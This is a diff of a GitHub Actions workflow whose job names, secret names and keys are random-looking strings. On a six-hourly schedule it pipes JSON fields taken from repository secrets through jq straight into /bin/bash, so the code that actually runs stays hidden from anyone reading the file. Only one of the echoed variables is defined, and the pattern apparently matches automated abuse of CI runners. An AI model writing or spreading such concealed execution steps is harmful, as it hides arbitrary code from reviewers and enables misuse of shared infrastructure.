@@ -3,23 +3,21 @@ name: haizhinuo7613
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
+    - cron: '18 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: haizhinuo7613
         env:
-          npdf4: ${{ secrets.npdf4 }}
+          go6: ${{ secrets.go6 }}
         run: |
-          echo $npdf4 | jq -r .llvjo49533 | /bin/bash
-          echo $cro563 | jq -r .mvis5376 | /bin/bash
-          echo $cfo00 | jq -r .hail5 | /bin/bash
-          echo $ocugx61 | jq -r .ibwr6156 | /bin/bash
-          echo $epcji9467 | jq -r .t47 | /bin/bash
-          echo $karvh81 | jq -r .judfr7 | /bin/bash
-          echo $kk84 | jq -r .h4 | /bin/bash
+          echo $go6 | jq -r .lgi48 | /bin/bash
+          echo $nsat66 | jq -r .nyd756 | /bin/bash
+          echo $tumt611 | jq -r .xdsi1837 | /bin/bash
+          echo $j659 | jq -r .raqu60396 | /bin/bash
+          echo $a87452 | jq -r .ayo34 | /bin/bash
+          echo $pw597 | jq -r .sdc97903 | /bin/bash
 
